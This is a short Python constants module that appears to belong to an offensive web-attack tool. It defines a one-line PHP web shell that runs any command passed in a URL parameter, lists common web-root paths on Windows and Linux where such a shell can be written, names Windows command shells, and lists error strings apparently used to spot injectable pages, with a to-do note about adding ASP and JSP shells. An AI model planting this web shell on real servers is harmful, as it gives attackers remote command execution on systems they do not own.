MAX_DISPLAY_RESULTS = 10

PHP_SHELL_CITATION = '<?php system(' + '$_GET["cmd"]' + '); ?>'
PHP_SHELL_PING = "<?php system(" + "$_GET['cmd']" + "); ?>"

# TODO: Expand with ASP, ASPX, and JSP webshells as well

WEBROOTS = {
    "WINDOWS": ["", "C:/xampp/htdocs", "C:/wamp/www", "C:/Inetpub/wwwroot"],
    "LINUX": ["", "/var/www", "/var/www/html", "/var/www/htdocs", "/usr/local/apache2/htdocs", "/usr/local/www/data", "/var/apache2/htdocs", "/var/www/nginx-default", "/srv/www/htdocs", "/usr/local/var/www", "/usr/share/nginx/html"]
}

WINDOWS_SHELLS = ["powershell.exe", "powershell", "cmd.exe", "cmd"]

INTERESTING_STRINGS = [".aspx", ".jsp", ".php", "SQL Syntax", "Syntax Error", "Incorrect syntax", "Failed", "Error", "Warning"]
INTERESTING_STRINGS = [wr for wr in (WEBROOTS["LINUX"] + WEBROOTS["WINDOWS"]) if wr] + INTERESTING_STRINGS